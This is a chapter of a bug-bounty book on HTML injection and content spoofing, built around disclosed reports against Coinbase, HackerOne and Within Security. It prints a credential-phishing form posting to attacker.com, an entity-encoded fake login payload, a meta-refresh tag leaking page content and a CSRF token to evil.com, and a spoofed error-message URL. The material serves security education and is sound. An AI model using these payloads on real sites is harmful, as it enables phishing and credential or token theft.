<html><head></head><body>
<h2 class="h2" id="ch05"><span epub:type="pagebreak" id="page_41"/><strong><span class="big">5</span><br/>HTML INJECTION AND CONTENT SPOOFING</strong></h2>&#13;
<div class="image1"><img alt="Image" src="../images/common.jpg"/></div>&#13;
<p class="noindent"><em>Hypertext Markup Language (HTML) injection</em> and <em>content spoofing</em> are attacks that allow a malicious user to inject content into a site’s web pages. The attacker can inject HTML elements of their own design, most commonly as a <code>&lt;form&gt;</code> tag that mimics a legitimate login screen in order to trick targets into submitting sensitive information to a malicious site. Because these types of attacks rely on fooling targets (a practice sometimes called <em>social engineering</em>), bug bounty programs view content spoofing and HTML injection as less severe than other vulnerabilities covered in this book.</p>&#13;
<p class="indent">An HTML injection vulnerability occurs when a website allows an attacker to submit HTML tags, typically via some form input or URL parameters, which are then rendered directly on the web page. This is similar to cross-site scripting attacks, except those injections allow for the execution of malicious JavaScript, which I’ll discuss in <a href="ch07.xhtml#ch07">Chapter 7</a>.</p>&#13;
<p class="indent">HTML injection is sometimes referred to as <em>virtual defacement</em>. That’s because developers use the HTML language to define the structure of a web <span epub:type="pagebreak" id="page_42"/>page. So if an attacker can inject HTML and the site renders it, the attacker can change what a page looks like. This technique of tricking users into submitting sensitive information through a fake form is referred to as <em>phishing</em>.</p>&#13;
<p class="indent">For example, if a page renders content that you can control, you might be able to add a <code>&lt;form&gt;</code> tag to the page asking the user to reenter their username and password, like this:</p>&#13;
<pre><span class="ent">➊</span> &lt;form method='POST' action='http://<span class="codeitalic1">attacker</span>.com/capture.php' id='login-form'&gt;<br/>&#13;
      &lt;input type='text' name='username' value=''&gt;<br/>&#13;
      &lt;input type='password' name='password' value=''&gt;<br/>&#13;
      &lt;input type='submit' value='submit'&gt;<br/>&#13;
   &lt;/form&gt;</pre>&#13;
<p class="indent">When a user submits this form, the information is sent to an attacker’s website <em>http://&lt;attacker&gt;.com/capture.php</em> via an <code>action</code> attribute <span class="ent">➊</span>.</p>&#13;
<p class="indent">Content spoofing is very similar to HTML injection except attackers can only inject plaintext, not HTML tags. This limitation is typically caused by sites either escaping any included HTML or HTML tags being stripped when the server sends the HTTP response. Although attackers can’t format the web page with content spoofing, they might be able to insert text, such as a message, that looks as though it’s legitimate site content. Such messages can fool targets into performing an action but rely heavily on social engineering. The following examples demonstrate how you can explore these vulnerabilities.</p>&#13;
<h3 class="h3" id="ch05lev1sec1"><strong>Coinbase Comment Injection Through Character Encoding</strong></h3>&#13;
<p class="hangt"><strong>Difficulty:</strong> Low</p>&#13;
<p class="hang"><strong>URL:</strong> <em>https://coinbase.com/apps/</em></p>&#13;
<p class="hang"><strong>Source:</strong> <em><a href="https://hackerone.com/reports/104543/">https://hackerone.com/reports/104543/</a></em></p>&#13;
<p class="hang"><strong>Date reported:</strong> December 10, 2015</p>&#13;
<p class="hangb"><strong>Bounty paid:</strong> $200</p>&#13;
<p class="noindent">Some websites will filter out HTML tags to defend against HTML injection; however, you can sometimes get around this by understanding how character HTML entities work. For this vulnerability, the reporter identified that Coinbase was decoding HTML entities when rendering text in its user reviews. In HTML, some characters are <em>reserved</em> because they have special uses (such as angle brackets, <code>&lt; &gt;</code>, which start and end HTML tags), whereas <em>unreserved characters</em> are normal characters with no special meaning (such as letters of the alphabet). Reserved characters should be rendered using their HTML entity name; for example, the <code>&gt;</code> character should be rendered by sites as <code>&amp;gt;</code> to avoid injection vulnerabilities. But even an unreserved character can be rendered with its HTML encoded number; for example, the letter <code>a</code> can be rendered as <code>&amp;#97;</code>.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_43"/>For this bug, the bug reporter first entered plain HTML into a text entry field made for user reviews:</p>&#13;
<pre>&lt;h1&gt;This is a test&lt;/h1&gt;</pre>&#13;
<p class="indent">Coinbase would filter the HTML and render this as plaintext, so the submitted text would post as a normal review. It would look exactly as entered with the HTML tags removed. However, if the user submitted text as HTML encoded values, like this:</p>&#13;
<pre>&amp;#60;&amp;#104;&amp;#49;&amp;#62;&amp;#84;&amp;#104;&amp;#105;&amp;#115;&amp;#32;&amp;#105;&amp;#115;&amp;#32;&amp;#97;&amp;#32;&amp;#<br/>&#13;
116;&amp;#101;&amp;#115;&amp;#116;&amp;#60;&amp;#47;&amp;#104;&amp;#49;&amp;#62;</pre>&#13;
<p class="indent">Coinbase wouldn’t filter out the tags and would decode this string into the HTML, which would result in the website rendering the <code>&lt;h1&gt;</code> tags in the submitted review:</p>&#13;
<p class="indent"><span class="big"><strong>This is a test</strong></span></p>&#13;
<p class="indent">Using HTML-encoded values, the reporting hacker demonstrated how he could make Coinbase render username and password fields:</p>&#13;
<pre>&amp;#85;&amp;#115;&amp;#101;&amp;#114;&amp;#110;&amp;#97;&amp;#109;&amp;#101;&amp;#58;&amp;#60;&amp;#98;&amp;#114;&amp;#62;&amp;#10;&amp;<br/>&#13;
#60;&amp;#105;&amp;#110;&amp;#112;&amp;#117;&amp;#116;&amp;#32;&amp;#116;&amp;#121;&amp;#112;&amp;#101;&amp;#61;&amp;#34;&amp;#116<br/>&#13;
;&amp;#101;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#110;&amp;#97;&amp;#109;&amp;#101;&amp;#61;&amp;#34;&amp;#102;&amp;#105;&amp;#11<br/>&#13;
4;&amp;#115;&amp;#116;&amp;#110;&amp;#97;&amp;#109;&amp;#101;&amp;#34;&amp;#62;&amp;#10;&amp;#60;&amp;#98;&amp;#114;&amp;#62;&amp;#10;<br/>&#13;
&amp;#80;&amp;#97;&amp;#115;&amp;#115;&amp;#119;&amp;#111;&amp;#114;&amp;#100;&amp;#58;&amp;#60;&amp;#98;&amp;#114;&amp;#62;&amp;#10;&amp;<br/>&#13;
#60;&amp;#105;&amp;#110;&amp;#112;&amp;#117;&amp;#116;&amp;#32;&amp;#116;&amp;#121;&amp;#112;&amp;#101;&amp;#61;&amp;#34;&amp;#112<br/>&#13;
;&amp;#97;&amp;#115;&amp;#115;&amp;#119;&amp;#111;&amp;#114;&amp;#100;&amp;#34;&amp;#32;&amp;#110;&amp;#97;&amp;#109;&amp;#101;&amp;#6<br/>&#13;
1;&amp;#34;&amp;#108;&amp;#97;&amp;#115;&amp;#116;&amp;#110;&amp;#97;&amp;#109;&amp;#101;&amp;#34;&amp;#62;</pre>&#13;
<p class="indent">This resulted in HTML that would look like the following:</p>&#13;
<pre>Username:&lt;br&gt;<br/>&#13;
&lt;input type="text" name="firstname"&gt;<br/>&#13;
&lt;br&gt;<br/>&#13;
Password:&lt;br&gt;<br/>&#13;
&lt;input type="password" name="lastname"&gt;</pre>&#13;
<p class="indent">This rendered as text input forms that looked like a place to enter a username and password login. A malicious hacker could have used the vulnerability to trick users into submitting an actual form to a malicious website where they could capture credentials. However, this vulnerability depends on users being fooled into believing the login is real and submitting their information, which isn’t guaranteed. Consequently, Coinbase rewarded a lower payout compared to a vulnerability that wouldn’t have required user interaction.</p>&#13;
<h4 class="h4" id="ch05lev2sec1"><span epub:type="pagebreak" id="page_44"/><strong><em>Takeaways</em></strong></h4>&#13;
<p class="noindent">When you’re testing a site, check how it handles different types of input, including plaintext and encoded text. Be on the lookout for sites that accept URI-encoded values, like <code>%2F</code>, and render their decoded values, which in this case would be <code>/</code>.</p>&#13;
<p class="indent">You’ll find a great Swiss army knife that includes encoding tools at <em><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></em>. Check it out and try the different types of encoding it supports.</p>&#13;
<h3 class="h3" id="ch05lev1sec2"><strong>HackerOne Unintended HTML Inclusion</strong></h3>&#13;
<p class="hangt"><strong>Difficulty:</strong> Medium</p>&#13;
<p class="hang"><strong>URL:</strong> <em>https://hackerone.com/reports/&lt;report_id&gt;/</em></p>&#13;
<p class="hang"><strong>Source:</strong> <em><a href="https://hackerone.com/reports/110578/">https://hackerone.com/reports/110578/</a></em></p>&#13;
<p class="hang"><strong>Date reported:</strong> January 13, 2016</p>&#13;
<p class="hangb"><strong>Bounty paid:</strong> $500</p>&#13;
<p class="noindent">This example and the following section require an understanding of Markdown, hanging single quotes, React, and the Document Object Model (DOM), so I’ll cover these topics first and then how they resulted in two related bugs.</p>&#13;
<p class="indent"><em>Markdown</em> is a type of markup language that uses a specific syntax to generate HTML. For example, Markdown will accept and parse plaintext preceded by a hash symbol (<code>#</code>) to return HTML that is formatted into header tags. The markup <code># Some Content</code> will generate the HTML <code>&lt;h1&gt;Some Content&lt;/h1&gt;</code>. Developers often use Markdown in website editors because it’s an easy language to work with. In addition, on sites that allow users to submit input, developers don’t need to worry about malformed HTML because the editor handles generating the HTML for them.</p>&#13;
<p class="indent">The bugs I’ll discuss here used Markdown syntax to generate an <code>&lt;a&gt;</code> anchor tag with a <code>title</code> attribute. Normally, the syntax for this is:</p>&#13;
<pre>[test](https://torontowebsitedeveloper.com "Your title tag here")</pre>&#13;
<p class="indent">The text between the brackets becomes the displayed text, and the URL to link to is included in parentheses along with a <code>title</code> attribute, which is contained in a set of double quotes. This syntax creates the following HTML:</p>&#13;
<pre>&lt;a href="https://torontowebsitedeveloper.com" title="Your title tag here"&gt;test&lt;/a&gt;</pre>&#13;
<p class="indent">In January 2016, the bug hunter Inti De Ceukelaire noticed that HackerOne’s Markdown editor was misconfigured; as a result, an attacker could inject a single hanging quote into Markdown syntax that would be included in the generated HTML anywhere HackerOne used the Markdown editor. Bug bounty program administration pages as well as reports were vulnerable. This was significant: if an attacker was able to find a second <span epub:type="pagebreak" id="page_45"/>vulnerability in an administration page and inject a second hanging quote at the beginning of the page in a <code>&lt;meta&gt;</code> tag (either by injecting the <code>&lt;meta&gt;</code> tag or finding an injection in a <code>&lt;meta&gt;</code> tag), they could leverage browser HTML parsing to exfiltrate page content. The reason is that <code>&lt;meta&gt;</code> tags tell browsers to refresh pages via the URL defined in the <code>content</code> attribute of the tag. When rendering the page, browsers will perform a <code>GET</code> request to the identified URL. The content in the page can be sent as a parameter of the <code>GET</code> request, which the attacker can use to extract the target’s data. Here is what a malicious <code>&lt;meta&gt;</code> tag with an injected single quote might look like:</p>&#13;
<pre>&lt;meta http-equiv="refresh" content='0; url=https://evil.com/log.php?text=</pre>&#13;
<p class="indent">The <code>0</code> defines how long the browser waits before making the HTTP request to the URL. In this case, the browser would immediately make an HTTP request to <em>https://evil.com/log.php?text=</em>. The HTTP request would include all content between the single quote beginning with the <code>content</code> attribute and the single quote injected by the attacker using the Markdown parser on the web page. Here is an example:</p>&#13;
<pre>&lt;html&gt;<br/>&#13;
  &lt;head&gt;<br/>&#13;
    &lt;meta http-equiv="refresh" content=<span class="ent">➊</span>'0; url=https://evil.com/log.php?text=<br/>&#13;
  &lt;/head&gt;<br/>&#13;
  &lt;body&gt;<br/>&#13;
    &lt;h1&gt;Some content&lt;/h1&gt;<br/>&#13;
    <span class="codeitalic1">--snip--</span><br/>&#13;
    &lt;input type="hidden" name="csrf-token" value= "ab34513cdfe123ad1f"&gt;<br/>&#13;
    <span class="codeitalic1">--snip--</span><br/>&#13;
    &lt;p&gt;attacker input with '<span class="ent">➋</span> &lt;/p&gt;<br/>&#13;
    <span class="codeitalic1">--snip--</span><br/>&#13;
  &lt;/body&gt;<br/>&#13;
&lt;/html&gt;</pre>&#13;
<p class="indent">The contents of the page from the first single quote after the <code>content</code> attribute at <span class="ent">➊</span> to the attacker-inputted single quote at <span class="ent">➋</span> would be sent to the attacker as part of the URL’s <code>text</code> parameter. Also included would be the sensitive cross-site request forgery (CSRF) token from the hidden input field.</p>&#13;
<p class="indent">Normally, the risk of HTML injection wouldn’t have been an issue for HackerOne because it uses the React JavaScript framework to render its HTML. React is a Facebook library developed to dynamically update web page content without having to reload the entire page. Another benefit of using React is that the framework will escape all HTML unless the JavaScript function <code>dangerouslySetInnerHTML</code> is used to directly update the DOM and render the HTML (the <em>DOM</em> is an API for HTML and XML documents that allows developers to modify the structure, style, and content of a web page via JavaScript). As it turns out, HackerOne was using <code>dangerouslySetInnerHTML</code> because it trusted the HTML it was receiving from its servers; therefore, it was injecting HTML directly into the DOM without escaping it.</p>&#13;
<p class="indent">Although De Ceukelaire couldn’t exploit the vulnerability, he did identify pages where he was able to inject a single quote after HackerOne <span epub:type="pagebreak" id="page_46"/>was rendering a CSRF token. So conceptually, if HackerOne made a future code change that allowed an attacker to inject another single quote in a <code>&lt;meta&gt;</code> tag on the same page, the attacker could exfiltrate a target’s CSRF token and perform a CSRF attack. HackerOne agreed with the potential risk, resolved the report, and awarded De Ceukelaire $500.</p>&#13;
<h4 class="h4" id="ch05lev2sec2"><strong><em>Takeaways</em></strong></h4>&#13;
<p class="noindent">Understanding the nuances of how browsers render HTML and respond to certain HTML tags opens up a vast attack surface. Although not all programs will accept reports about potential theoretical attacks, this knowledge will help you find other vulnerabilities. FileDescriptor has a great explanation about the <code>&lt;meta&gt;</code> refresh exploit at <em><a href="https://blog.innerht.ml/csp-2015/#contentexfiltration">https://blog.innerht.ml/csp-2015/#contentexfiltration</a></em>, which I highly recommend you check out.</p>&#13;
<h3 class="h3" id="ch05lev1sec3"><strong>HackerOne Unintended HTML Include Fix Bypass</strong></h3>&#13;
<p class="hangt"><strong>Difficulty:</strong> Medium</p>&#13;
<p class="hang"><strong>URL:</strong> <em>https://hackerone.com/reports/&lt;report_id&gt;/</em></p>&#13;
<p class="hang"><strong>Source:</strong> <em><a href="https://hackerone.com/reports/112935/">https://hackerone.com/reports/112935/</a></em></p>&#13;
<p class="hang"><strong>Date reported:</strong> January 26, 2016</p>&#13;
<p class="hangb"><strong>Bounty paid:</strong> $500</p>&#13;
<p class="noindent">When an organization creates a fix and resolves a report, the feature won’t always end up bug-free. After reading De Ceukelaire’s report, I decided to test HackerOne’s fix to see how its Markdown editor was rendering unexpected input. To do so, I submitted the following:</p>&#13;
<pre>[test](http://www.torontowebsitedeveloper.com "test ismap="alert xss"<br/>&#13;
  yyy="test"")</pre>&#13;
<p class="indent">Recall that in order to create an anchor tag with Markdown, you normally provide a URL and a <code>title</code> attribute surrounded by double quotes in parentheses. To parse the <code>title</code> attribute, Markdown needs to keep track of the opening double quote, the content following it, and the closing quote.</p>&#13;
<p class="indent">I was curious as to whether I could confuse Markdown with additional random double quotes and attributes and whether it would mistakenly begin to track those as well. This is the reason I added <code>ismap=</code> (a valid HTML attribute), <code>yyy=</code> (an invalid HTML attribute), and extra double quotes. After submitting this input, the Markdown editor parsed the code into the following HTML:</p>&#13;
<pre>&lt;a title="test" ismap="alert xss" yyy="test" ref="http://<br/>&#13;
  www.toronotwebsitedeveloper.com"&gt;test&lt;/a&gt;</pre>&#13;
<p class="indent">Notice that the fix from De Ceukelaire’s report resulted in an unintended bug that caused the Markdown parser to generate arbitrary HTML. Although I couldn’t immediately exploit this bug, the inclusion of unescaped <span epub:type="pagebreak" id="page_47"/>HTML was enough of a proof of concept for HackerOne to revert its previous fix and correct the issue using a different solution. The fact that someone could inject arbitrary HTML tags could lead to vulnerabilities, so HackerOne awarded me a $500 bounty.</p>&#13;
<h4 class="h4" id="ch05lev2sec3"><strong><em>Takeaways</em></strong></h4>&#13;
<p class="noindent">Just because code is updated doesn’t mean all vulnerabilities are fixed. Be sure to test changes—and be persistent. When a fix is deployed, it means there is new code, which could contain bugs.</p>&#13;
<h3 class="h3" id="ch05lev1sec4"><strong>Within Security Content Spoofing</strong></h3>&#13;
<p class="hangt"><strong>Difficulty:</strong> Low</p>&#13;
<p class="hang"><strong>URL:</strong> <em><a href="https://withinsecurity.com/wp-login.php">https://withinsecurity.com/wp-login.php</a></em></p>&#13;
<p class="hang"><strong>Source:</strong> <em><a href="https://hackerone.com/reports/111094/">https://hackerone.com/reports/111094/</a></em></p>&#13;
<p class="hang"><strong>Date reported:</strong> January 16, 2016</p>&#13;
<p class="hangb"><strong>Bounty paid:</strong> $250</p>&#13;
<p class="noindent"><em>Within Security</em>, a HackerOne site meant to share security news, was built on WordPress and included a standard WordPress login path at the page <em><a href="http://withinsecurity.com/wp-login.php">withinsecurity.com/wp-login.php</a></em>. A hacker noticed that during the login process, if an error occurred, <em>Within Security</em> would render an <code>access_denied</code> error message, which also corresponded to the <code>error</code> parameter in the URL:</p>&#13;
<pre>https://withinsecurity.com/wp-login.php?error=access_denied</pre>&#13;
<p class="indent">Noticing this behavior, the hacker tried modifying the <code>error</code> parameter. As a result, the site rendered values passed to the parameter as part of the error message presented to users, and even URI-encoded characters were decoded. Here is the modified URL the hacker used:</p>&#13;
<pre>https://withinsecurity.com/wp-login.php?error=Your%20account%20has%20been%20<br/>&#13;
hacked%2C%20Please%20call%20us%20this%20number%20919876543210%20OR%20Drop%20<br/>&#13;
mail%20at%20attacker%40mail.com&amp;state=cb04a91ac5%257Chttps%253A%252F%252Fwithi<br/>&#13;
nsecurity.com%252Fwp-admin%252F#</pre>&#13;
<p class="indent">The parameter rendered as an error message that displayed above the WordPress login fields. The message directed the user to contact an attacker-owned phone number and email.</p>&#13;
<p class="indent">The key here was noticing that the parameter in the URL was being rendered on the page. Simply testing whether you could change the <code>access_denied</code> parameter revealed this vulnerability.</p>&#13;
<h4 class="h4" id="ch05lev2sec4"><strong><em>Takeaways</em></strong></h4>&#13;
<p class="noindent">Keep an eye on URL parameters that are passed and rendered as site content. They may present opportunities for text injection vulnerabilities that <span epub:type="pagebreak" id="page_48"/>attackers can use to phish targets. Controllable URL parameters rendered on a website sometimes result in cross-site scripting attacks, which I’ll cover in <a href="ch07.xhtml#ch07">Chapter 7</a>. Other times this behavior allows only less impactful content spoofing and HTML injection attacks. It’s important to keep in mind that although this report paid $250, it was the minimum bounty for <em>Within Security</em>. Not all programs value or pay for HTML injection and content spoofing reports because, similar to social engineering, they depend on targets being fooled by the injected text.</p>&#13;
<div class="image"><a id="ch05fig01"/><img alt="image" src="../images/05fig01.jpg"/></div>&#13;
<p class="figcap"><em>Figure 5-1: The attacker was able to inject this “warning” into the WordPress admin page.</em></p>&#13;
<h3 class="h3" id="ch05lev1sec5"><strong>Summary</strong></h3>&#13;
<p class="noindent">HTML injection and content spoofing allow a hacker to input information and have an HTML page reflect that information back to a target. Attackers can use these attacks to phish users and trick them into visiting or submitting sensitive information to malicious websites.</p>&#13;
<p class="indent">Discovering these types of vulnerabilities is not only about submitting plain HTML but also about exploring how a site might render your inputted text. Hackers should be on the lookout for opportunities to manipulate URL parameters that are directly rendered on a site.</p>&#13;
</body></html>